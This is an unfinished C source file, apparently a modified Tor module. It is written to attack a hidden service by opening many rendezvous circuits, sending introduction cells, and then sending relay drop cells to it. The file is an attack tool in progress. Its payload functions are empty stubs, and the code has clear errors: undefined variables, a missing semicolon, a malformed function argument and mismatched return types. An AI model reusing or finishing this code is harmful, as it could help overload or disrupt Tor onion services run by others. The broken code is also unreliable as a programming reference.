/**
 * \file hs_rd_attack.c
 * \brief contains code to connect to request hidden service and send
 *  relay drop cells to it 
 **/

#include "hs_rd_attack.h"
#include "or.h"
#include "circuituse.h"
#include "rendclient.h"
#include "uti.h"
/* Global variable but not accessible from other files
 * Allow the program to keep a state of the attack 
 *
 * A little bit sexier than extern variables, still messy
 * but ... Ca casse pas trois pattes a un canard :-)
 */

/*NOTE
 *
 * Use control_event to talk with controller
 *
 * Need event-based control to carry out the steps of the attack
 */
static hs_rd_attack_t *attack_infos = NULL;

hs_attack_stats hs_attack_entry_point(hs_attack_cmd_t cmd, char *onionaddress,
    uint16_t nbr_circuits, time_t until){
  if (!attack_infos){
    attack_infos = (hs_rd_attack_t *) tor_malloc(sizeof(hs_rd_attack_t));
    attack_infos->rendcircs = smartlist_new();
  }
  switch(cmd){
    case ESTABLISH_RDV:
      // Establish all rendezvous circuits
      if (init_rendezvous_circuits(nbr_circuits, onionaddress < 0)) {
        return NULL;
      }
      if (init_intro_circuit(onionservice) < 0) {
        // something bad happenned
        return NULL;
      }
      return attack_infos->stats;
      break;
    case SEND_RD: launch_attack(until); break;
    default: break;
  }
}

int init_rendezvous_circuits(uint16_t nbr_circuits, char *onionaddress) {
  //XXX might loop infinitly => should return -1 if too much circ launch
  // failed  (define 'too much' ? )
  int c = 0;
  while (attack_info->rendcircs->num_used < nbr_circuits) {
    circ_info_t *rendcirc = (circ_info_t *) tor_malloc(sizeof(circ_info_t));
    rendcirc->state = REND_CIRC_BUILDING;
    rendcirc->circ = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
        CIRCLAUNCH_IS_INTERNAL);
    if (rendcirc->circ) {
      rendcirc->circ->rend_data =
        rend_data_client_create(onionaddress, NULL, NULL, REND_NO_AUTH);
      smartlist_add(attack_infos->rendcircs, rendcirc);
    } else {
      c++;
      tor_free(rendcirc);
      if (c >= RETRY_THRESHOLD*nbr_circuits)
        return -1;
    }
  }
  return 0;
}

/*
 * Create a circuit towards the introduction point and send
 * nbr_circuits different INTRO1 cells
 */

int init_intro_circuit(int retry){
  int flags = CIRCLAUNCH_IS_INTERNAL | CIRCLAUNCH_ONEHOP_TUNNEL;

  attack_infos->circ_to_intro = (circ_info_t *) tor_malloc(
      sizeof(struct circ_info_t));
  attack_infos->circ_to_intro->circ = circuit_launch(CIRCUIT_PURPOSE_C_INTRODUCING,
       CIRCLAUNCH_IS_INTERNAL)
  if (!attack_infos->circ_to_intro->circ){
    if (retry < RETRY_THRESHOLD){
      tor_free(attack_infos->circ_to_intro);
      return init_intro_circuit(++retry);
    }
    else
      return -1;
  }
  attack_infos->circ_to_intro->state = INTRO_CIRC_BUILDING;
  return 0;
}

/*
 * Called by rend_client_rendezvous_acked to launch introcell 
 * if introcel circuit is ready
 */
void hs_attack_send_intro_cell_callback(origin_circuit_t *rendcirc){
  int retval;
  if (attack_infos->circ_to_intro->state == INTRO_CIRC_READY) {
    if (!rendcirc) { //called when INTRO_CIRC_ACKED
      /*iter attack_infos->rendcircs for ready rendcircs*/
      SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, rendcirc_info) {
        if (rendcirc_info->state == REND_CIRC_READY_FOR_INTRO){
          retval = rend_client_send_introduction(attack_info->circ_to_intro->circ,
            rendcirc_info->circ);
          if(retval < 0)
            goto err;
          rendcirc_info->state = REND_CIRC_INTRO_CELL_SENT;
        }
      } SMARTLIST_FOREACH_END(rendcirc_info);

    } else {
     /*send intro cell down introcirc with rendcirc circ
      */
      retval = rend_client_send_introduction(attack_infos->circ_to_intro->circ,
            rendcirc);
      if (retval < 0)
        goto err;
      /* update rendcirc state*/
      SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, rendcirc_info) {
        if (rendcirc_info->circ == rendcirc){
          rendcirc_info->state = REND_CIRC_INTRO_CELL_SENT;
          break;
        }
      }
    }
    // todo
  }
 err:
  //tell controler what happens depending on retvals
  control_event_hs_attack();

}

void hs_attack_mark_intro_ready() {
  attack_infos->circ_to_intro->state = INTRO_CIRC_READY;
}

/*
 * Almost a copy of 
 *
 * Create a valid relay drop cell for session with circuit circ and sent it through circ
 *
 * If the cell cannot be sent, we mark the circuit for close and return -1
 */

int send_rd_cell(circuit_t *circ){

}

void free_hs_rd_attack(){

}

